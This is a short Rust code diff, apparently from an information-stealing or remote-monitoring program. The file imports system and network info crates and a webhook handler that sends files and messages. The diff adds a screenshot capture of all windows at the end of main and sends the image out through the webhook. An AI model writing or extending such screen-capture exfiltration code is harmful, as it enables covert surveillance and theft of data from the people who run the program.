@@ -1,6 +1,7 @@
 use netif;
-use crate::webhook_handler::{send_files, send_message};
+use crate::webhook_handler::{send_files, send_img_RGBA, send_message};
 use sysinfo::{System};
+use crate::screenshot_all::window_screenshot;
 
 pub mod screenshot_all;
 
@@ -34,6 +35,8 @@ async fn main() {
     };
 
     r.sendMessage().await;
+    let v = window_screenshot(None);
+    send_img_RGBA(v).await
 }
 
 fn initialize(){
